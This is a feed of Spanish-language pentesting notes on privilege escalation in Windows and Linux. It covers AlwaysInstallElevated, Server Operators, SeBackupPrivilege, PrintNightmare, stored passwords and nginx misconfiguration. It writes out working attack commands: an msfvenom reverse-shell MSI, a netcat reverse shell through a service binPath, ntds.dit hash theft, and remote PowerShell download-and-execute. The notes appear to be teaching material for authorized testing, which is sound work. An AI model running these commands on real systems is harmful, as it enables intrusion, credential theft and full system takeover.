Copy<br>Una vez exportada, podríamos hacer uso de la herramienta impacket-wmiexec. WMI es una interfaz de administración de Windows que permite a los administradores gestionar y consultar información sobre los sistemas operativos Windows y los servicios que se ejecutan en ellos. Esta herramienta (wmiexec) aprovecha el protocolo WMI para ejecutar comandos y scripts en hosts remotos que admiten este protocolo. <br>impacket-wmiexec {complete_name_dc} -k -no-pass
Copy<br>Una vez ejecutado este comando, obtendriamos acceso al sistema como el usuario Administrador. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abuso-de-allowedtodelegate.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abuso de AllowedToDelegate.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:06 GMT</pubDate></item><item><title><![CDATA[Abuso de AlwaysInstallElevated]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> 
<br><br><br>El permiso AlwaysInstallElevated se refiere a una configuración de políticas de seguridad que afecta a la instalación de paquetes MSI (Windows Installer) y aplicaciones en sistemas operativos Windows. En resumen, permite a usuarios no administradores instalar paquetes MSI con privilegios elevados en Windows.<br><br><br>En caso de que estemos con herramientas como <a data-tooltip-position="top" aria-label="https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0" rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0" target="_blank">WinPEAS</a> analizando vías potenciales de escalar privilegios y veamos que tenemos el permiso AlwaysInstallElevated seteado en 1 con HKLM y HKCU podríamos empezara pensar visitar recursos como <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" target="_blank">HackTricks</a> para abusar de esto e intentar escalar privilegios. <br>Para entender más en profundidad el a que refiere HKLM y HKCU, podemos visitar el apartado de <a data-href="0. Windows Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics</a>.<br>Una vez verificado que ambos permisos esten seteados en 1, podríamos comenzar con la explotación para escalar privilegios, en este caso lo primero que tendríamos que hacer es crear un payload con la herramienta msfvenom. <br>msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST={our_ip} LPORT={our_port} -f msi -o privesc.msi
Copy<br>Una vez creado el payload deberíamos transferirlo a la máquina victima, esto podríamos hacerlo con un simple certutil.exe.<br>certutil.exe -f --urlcache -split http://{our_ip}/privesc.msi
Copy<br>Una vez transferido el payload, solo quedaría abusar del privilegio AlwasyInstallElevated instalando el archivo malicioso msi creado.<br>msiexec /quiet /qn /i C:\{our}\{path}\privesc.msi
# /quiet -&gt; No user interaction
# /qn -&gt; No User Interface
# /i -&gt; Status messages
Copy<br>Al momento de la ejecución de este último comando estaríamos instalando el archivo msi logrando que de manera privilegiada se ejecute el envío de una consola interactiva privilegiada al puerto y la ip especificada en el proceso de creación del payload con la herramienta msfvenom. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abuso-de-alwaysinstallelevated.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abuso de AlwaysInstallElevated.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 16:49:03 GMT</pubDate></item><item><title><![CDATA[Abuso de binarios específicos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>Muchas veces en los sistemas comprometidos se alojan binarios vulnerables por diversas causas a una escalada de privilegios. Sean binarios vulnerables conocidos con su respectivo CVE, o <a data-href="Buffer Overflow" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/4.-advanced/buffer-overflow/buffer-overflow.html" class="internal-link" target="_self" rel="noopener nofollow">Buffer Overflow</a>, entre otras. El abuso de binarios específicos sean legítimos o personalizados, pueden ser explotados para obtener privilegios elevados, lo que destaca la importancia de una adecuada configuración y protección en los sistemas. <br>En sistemas Windows podríamos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/dnSpy/dnSpy" rel="noopener nofollow" class="external-link" href="https://github.com/dnSpy/dnSpy" target="_blank">dnsPy</a> para analizar binarios a bajo nivel. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abuso-de-binarios-específicos.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abuso de binarios específicos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:07 GMT</pubDate></item><item><title><![CDATA[Abuso de grupo 'Server Operators']]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags:  <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>Los miembros del grupo Server Operators pueden administrar el DC. Este grupo existe solo en los DC. Por default no tiene miembros y permite a los miembros ejecutar las siguientes acciones:<br>
<br>


<br>


<br>


<br><br><br>La escalada de privilegios en este caso se da a raiz de que un usuario pertenezca al grupo Server Operators de manera que entendemos que dentro de varíos permisos que contiene, puede iniciar y detener servicios. Lo que en caso de que hayan servicios existentes (O no) conlleva un riesgo. <br>En caso de que hayan servicios existentes o no, lo primero que podemos hacer es intentar crear nuestro propio servicio para abusar del binPath para cargar una instrucción que queremos que se realize a la hora de inicializar el servicio. <br>Podríamos subir a la máquina Windows vulnerada el binario de netcat para alojarlo en una ruta, por ejemplo C:\Users\Dobliuw\Desktop\nc.exe y una vez alojado, crear un servicio para abusar del binPath: sc.exe create {name} binPath="C:\Users\Dobliuw\Desktop\nc.exe -e cmd {ip} {port}"<br>En caso de que no podramos crear un servicio, podríamos intentar cambiar la configuración de un servicio existente (Comando services para listar los servicios) creado consc.exe config {ServiceName} binPath "C:\Users\Dobliuw\Desktop\nc.exe -e cmd {ip} {port}".<br>Una vez más, en caso de que no podrámos editar la configuración de un servicio, lo que podríamos hacer es probar con todos y ver si en algun momento nos permite editar la configuración de alguno. <br>Ahora si, una vez lograda la edición de la configuración de un servicio o hayamos podido crear el nuestro con el binPath malicioso, simplemente podríamos detener el servicio y levantarlo para abusar de estos privilegios del grupo. <br>sc.exe stop/start {ServiceName}]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abuso-de-grupo-&apos;server-operators&apos;.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abuso de grupo &apos;Server Operators&apos;.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:07 GMT</pubDate></item><item><title><![CDATA[Abuso de SeBackupPrivilege]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> 
<br><br><br>El privilegio SeBackupPrivilege es uno de los muchos privilegios de seguridad que se puieden asignar a losu suarios o grupos en el sitema opertivo Windows. Este privilegio otorga a un usuario o servcio la capacidad de realizar copias de seguridad de archvios y directorios, incluso si el usuario o servicio no tiene acceso explícito a esos recursos.<br><br><br>Como sabemos, el privilegio SeBackupPrivilege nos permite realizar copias de seguridad de archivos a los cuales no tenemos acceso, lo cual puede ser interesante de cara a archivos que puedan existir y puedan ser privilegiados, pero incluso en un entorno de <a data-href="Active Directory" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/windows/active-directory/active-directory.html" class="internal-link" target="_self" rel="noopener nofollow">Active Directory</a> esto puede ser aun más interesante ya que podríamos pensar en realizar un <a data-href="Pass The Hash" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/pass-the-hash.html" class="internal-link" target="_self" rel="noopener nofollow">Pass The Hash</a> volcando los hashes NT almacenados en la ruta C:\Windows\NTDS\ntds.dit. <br>Existen múltiples maneras de abusar de este privilegio las cuales pueden ser vistas en la página web de <a data-tooltip-position="top" aria-label="https://pentestlab.blog/tag/diskshadow/" rel="noopener nofollow" class="external-link" href="https://pentestlab.blog/tag/diskshadow/" target="_blank">pentestlab</a>, pero en este caso haremos uso de DiskShadow.<br><br># Creamos un archivo con el siguiente contenido: 
set context persistent nowriters 
add volume c: alias {name_to_alias} 
create 
expose %{name_to_alias}% z: 
# IMPORTANTE: AGREGAR UN ESPACIO AL FINAL DE CADA LÍNEA
Copy<br>Una vez subido a la máquina victima o creado el archivo con el contenido indicado, podríamos abuscar del diskshadow.exe para crear una unidad (En este caso la z) con el contenido indicado. <br>diskshadow.exe /s C:\{path}\{to}\{file}\{uploaded}
Copy<br>De esta manera, se crea la shadow copy y se expone en la unidad z.<br>copy z:\Windows\NTDS\ntds.dit ntds.dit
# Intentamos crear la copia 
robocopy /b z:\Windows\NTDS\ . ntds.dit
# Si contamos con el privilegio SeBackupPrivilege es mejor hacer uso de robocopy
Copy<br>Una vez lograda la copia de seguridad, si la descargamos así como el archivo system también (reg save HKLM\system system) podríamos dumpear los hashes NT del Active Directory con impacket-secretsdump para realizar un <a data-href="Pass The Hash" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/pass-the-hash.html" class="internal-link" target="_self" rel="noopener nofollow">Pass The Hash</a>. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abuso-de-sebackupprivilege.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abuso de SeBackupPrivilege.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:07 GMT</pubDate></item><item><title><![CDATA[Intentos Básicos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> 
<br><br><br>A la hora de intentar escalar privilegios en un sistema windows, es muy importante identificar múltiples posibles vectores de manera prevía a comenzar a rebuscarnos la escalada, algunos de ellos son:<br>
<br>


<br># Incluir archivos ocultos
&gt; dir -Force
# Listar ADS: 
&gt; dir /r
Copy<br>Los ADS (Alternate Data Streams) son una característica del sistema de archivos NTFS (New technology File System) que permite asociar datos adicionales a un archivo o directorio. Básicamente, las ADS permiten almacenar información adicional, aparte de los datos principales del archivo, en un flujo de datos secundario.<br><br>echo "ADS content" &gt; {filename.extension}:{ADS_name.extension}
Copy<br><br>dir /r {filename.extension}
Copy<br><br>more &lt; {filename.extension}:{ADS_name.extension}
Copy<br>
<br>


<br>&gt; whoami /priv 
&gt; whoami /all
Copy<br>
<br>


<br>&gt; netstat -an
&gt; netstat -nat
&gt; netstat -ano -p tcp
Copy<br>
<br>


<br># Listar usuarios del sistema
&gt; net user 
# Listar información de un usuario
&gt; net user "{username}"

Copy<br>
<br>


<br>net localgroup "{groupname}"
Copy<br>
<br>


<br>&gt; tasklist
&gt; services
Copy<br>
<br>


<br># Información del sistema 
&gt; systeminfo
# Si el comando system info arroja error: 
reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
# Nombre de la máquina 
&gt; hostname
Copy<br>
<br>


<br># Listar ruta donde estaría el IIS,
# Servidor web y un conjunto de servicios para el sistema Windows.
&gt; cd C:\inetpub\wwwroot
&gt; dir 
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/intentos-básicos.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Intentos Básicos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:07 GMT</pubDate></item><item><title><![CDATA[Kernel]]></title><description><![CDATA[ 
 <br><br>Como vimos en <a data-href="Operative Systems Basics#Kernel" href="https://dobliuw.com/notes/3.-system/operative-systems/operative-systems-basics.html#Kernel" class="internal-link" target="_self" rel="noopener nofollow">Operative Systems Basics &gt; Kernel</a>, el mismo es un software que nos permite controlar todo el sistema, muchas veces (Sobre todo en versiones antiguas) el kernel puede contener vulnerabilidades explotables que nos permiten como atacantes obtener privilegios elevados, generalmente acceso a root o administrador.<br><img alt="kernel_image_example.png" src="https://dobliuw.com/lib/media/kernel_image_example.png"><br><br><br>Existen recursos como el repositorio de <a data-tooltip-position="top" aria-label="https://github.com/SecWiki/windows-kernel-exploits" rel="noopener nofollow" class="external-link" href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">Exploits para el Kernel de Windows</a> en donde podremos encontrar cantidad de vulnerabilidades en kernels de Windows conocidos los cuales podríamos intentar explotar tras reconocer que el sistema es vulnerable a través de la enumeración, como podemos visualizar en <a data-href="0. Enumerating possible privesc" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/0.-enumerating-possible-privesc.html" class="internal-link" target="_self" rel="noopener nofollow">0. Enumerating possible privesc</a>. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/kernel-exploit.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Kernel Exploit.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 03 Jun 2024 15:31:53 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/kernel_image_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/kernel_image_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Print Spooler (PrintNightmare)]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a>
<br><br><br>El Print Spooler (También conocido como "Spooler de impresión") en Windows es un servicio  del sistema operativo que administra la impresión de documentos en una impresora conectada a la computadora. Su función principal es manejar la cola de impresión, que es una lista de trabajos de impresión pendientes que esperan ser procesados y enviados a la impresora.<br><br><br>Un atacante remoto autenticado puede abusar del servicio de cola de impresión para cargar una DLL a través de una solicitud DCERPC diseñada, lo que resulta en la ejecución remota de código como NT AUTHORITY\SYSTEM. Este módulo utiliza el vector MS-RPRN que requiere que se esté ejecutando el servicio Print Spooler.<br><br><br>Para explotar esto, podemos hacer uso de un <a data-tooltip-position="top" aria-label="https://github.com/calebstewart/CVE-2021-1675" rel="noopener nofollow" class="external-link" href="https://github.com/calebstewart/CVE-2021-1675" target="_blank">script en powershell</a> que automatiza toda la explotación de esta vulnerabilidad asociada al CVE-2021-1675. <br><br>wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1

python3 -m http.server 80
Copy<br><br>IEX(New-Object Net.WebClient).downloadString('http://{our_ip}/CVE-2021-1675.ps1')

Invoke-Nightmare -DriverName "dobliuw" -NewUser "dobliuw" -NewPassword "dobliuw123$!"
Copy<br>Una vez realizado este proceso, se creara un nuevo usuario llamado dobliuw con la contraseña dobliuw123$! perteneciente al grupo Administrators de manera que habríamos escalado privilegios obteniendo el máximo acceso al sistema.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/print-spooler-(printnightmare).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Print Spooler (PrintNightmare).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:07 GMT</pubDate></item><item><title><![CDATA[PSCredential]]></title><description><![CDATA[ 
 <br><br>El objeto PSCredential de PowerShell es una clase fundamental utilizada para almacenar y manejar de manera segura credenciales. Es parte del namespace System.Management.Automation y está diseñado específicamente para guardar un nombre de usuario y una contraseña de manera segura. La contraseña dentro del objeto PSCredential esta almacenada como SecureString, lo que significa que esta encriptada en memoria y puede ser utilizada de manera segura a través de diferentes functiones y comandos (cmdlets) que requieran autenticación.<br><br>
<br>Creando la contraseña en SecureString  y construyendo el objeto PSCredential:
<br>&gt; $username = "dobliuw"
&gt; $password = ConvertTo-SecureString "dobliuw123" -AsPlainText -Force
&gt; $credential = New-Object System.Management.Automation.PSCredential($username, $password)
Copy<br><br>
<br>Exportar el objeto PSCredential a un archivo .xml:
<br>&gt; $credential | Export-Clixml -Path C:\Path\To\credentials.xml
Copy<br>
<br>Contenido del archivo .xml exportado:
<br>&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
  &lt;Obj RefId="0"&gt;
    &lt;TN RefId="0"&gt;
      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
      &lt;T&gt;System.Object&lt;/T&gt;
    &lt;/TN&gt;
    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
    &lt;Props&gt;
      &lt;S N="UserName"&gt;dobliuw&lt;/S&gt;
      &lt;SS N="Password"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000004004689635c6234d8b3d8c6dd0d5208800000000020000000000106600000001000020000000678d350bf4cbf597d93b823b4574eea53b6809ccd5b68725fff3a7972a95458f000000000e80000000020000200000005188120ac485f4e8a63e14df944242194f0edb31b58c7ab851697841a73a7f8b20000000587e1511e6ea906fca4145cbfd632b5b84a08009333d50ff6d73bde268bd59fa40000000652850a9d21da8091505ae7cc024f0d5a0f2f146a007a903bcb8c7d8c48e0a19e506f5e02811db254b91f99accc92d5a19f358248e98ba4a22e59c4653916cbf&lt;/SS&gt;
    &lt;/Props&gt;
  &lt;/Obj&gt;
&lt;/Objs&gt;
Copy<br><br>
<br>Importar archivo .xml:
<br>&gt; $credential = Import-Clixml -Path C:\Path\To\Credentials.xml
Copy<br>
<br>Extraer la contraseña y el usuario del objeto PSCredential importado:
<br>&gt; $password = $credential.GetNetworkCredential().Password
&gt; $username = $credential.UserName
&gt; echo "$username::$password"
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/pscredential-objects-(powershell).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/PSCredential Objects (PowerShell).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 19 Jun 2024 14:53:24 GMT</pubDate></item><item><title><![CDATA[Privesc by Stored Passwords]]></title><description><![CDATA[ 
 <br><br>Como pentesters sabemos que la búsqueda de credenciales hardcodeadas o almacenadas en archivos es una actividad la cual realizamos con la esperanza de encontrar estas, las cuales podrían ser reutilizadas en distintas aplicaciones, servicios o en el mejor de los casos, como contraseña de Administrador o un usuario privilegiado. En este caso puede ser muy buena idea buscar este tipo de eventos en el <a data-href="0. Windows Basics#Windows Registry" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html#Windows_Registry" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics &gt; Windows Registry</a> previo a realizar una búsqueda exhausta en todos los discos.<br># VNC (Virtual Network Computing)
&gt; reg query "HCKU\Software\ORL\WinVNC3\Password"
# Windows Autologin
&gt; reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# SNMP Parameters (Simple Network Manager Protocol)
&gt; reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
# PuTTY (SSH &amp; Telnet free client for Windows)
&gt; reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# Search for password in registry
&gt; reg query HKLM /f password /t REG_SZ /s
&gt; reg query HKCU /f password /t REG_SZ /s
Copy<br>Tras la búsqueda en el Registro de Windows, en caso de no encontrar nada, sería interesante realizar este tipo de búsquedas en todo el disco, lo cual llevará un tiempo de espera bastante alto.<br># Find all passwords in those files
&gt; findstr /si password *.txt
&gt; findstr /si password *.xml
&gt; findstr /si password *.ini
# Find all those strings in config files
&gt; dir /s *pass* == *cred* == *vnc* == *.config*
# Find all passwords in all files
&gt; findstr /spin "password" *.*
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/stored-passwords.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Stored Passwords.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 10 Jun 2024 13:35:00 GMT</pubDate></item><item><title><![CDATA[Abusing web server configuration]]></title><description><![CDATA[ 
 <br><br>Esta técnica implica abusar de herramientas que nos permiten crear servidores web como Nginx o Apache en caso de poder ejecutar como root estas, al ejecutar sudo -l veríamos que podemos ejecutar estas herramientas o mismo por alguna mala configuración que estas herramientas cuenten con permisos <a data-href="0. Linux Basics#SUID (Set User ID)" href="https://dobliuw.com/notes/3.-system/operative-systems/linux/0.-linux-basics.html#SUID_(Set_User_ID)" class="internal-link" target="_self" rel="noopener nofollow">0. Linux Basics &gt; SUID (Set User ID)</a>, etc. <br>Al poder ejecutar como root este tipo de herramientas podríamos crear un archivo de configuración para posteriormente cargarlo y exponer en un nuevo puerto la raíz del sistema, donde adicionalmente podríamos permitir métodos http como PUT o POST para, por ejemplo, dirigirnos a la ruta del directorio ssh de root (/root/.ssh/) y crear o editar el archivo authorized_keys donde cargariamos una clave pública de nuestra máquina de atacantes para así poder ganar acceso al sistema sin necesidad de proporcionar credenciales.<br><br><br>Una vez habiendo obtenido acceso al sistema, una de las primeras cosas que se nos vienen a la cabeza por validar estando en búsqueda de una vía potencial para escalar privilegios es verificar los permisos de ejecución que podría tener el usuario con el comando:<br>sudo -l
Copy<br>Una vez ejecutado el comando, visualizariamos aquellas configuraciones del archivo /etc/sudoers donde los administradores del sistema insertaran aquellos binarios que podemos ejecutar como distintos usuarios indicando si será necesario ingresar credenciales o no, etc. En este caso, validando estas permisos, podríamos ver un output similar a este:<br>.....
User dobliuw may run the following commands on hostname:
    (ALL:ALL) nginx
......
Copy<br>En este ejemplo, podemos ver que el usuario actual dobliuw puede ejectuar como cualquier usuario (Incluyendo root) sin proporcionar contraseña la herramienta nginx. Entendiendo esto podemos visualizar el panel de ayuda de esta herramienta:<br>nginx -h

......
Options:
.......
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
.......
Copy<br>De esta manera vemos que la herramienta cuenta con una opción para indicar un archivo de configuración, por lo que podríamos intentar crear unarchivo de configuración tomando de guía el archivo por defecto /etc/nginx/nginx.conf y haciendo uso de google podríamos buscar como realizar ciertas acciones que nos podrían interesar, como permitir el dorectory listing, como permitir métodos http como PUT o POST, etc.<br>nano /tmp/nginx.conf
Copy<br>
<br>nginx.conf
<br>user root; # This indicate that the server will run under the user root management

events {
	worker_connections 768;
}

http {
	server {
		listen  4444; # If we write localhost:4444 this wouldn't open to everyone, just for de machin itself
		root /; # Expose the path / 
		autoindex on; # Allow directory listing
		allow_methods ".*"; # Allow all http methods (GET, POST, PUT, etc)
	}
}
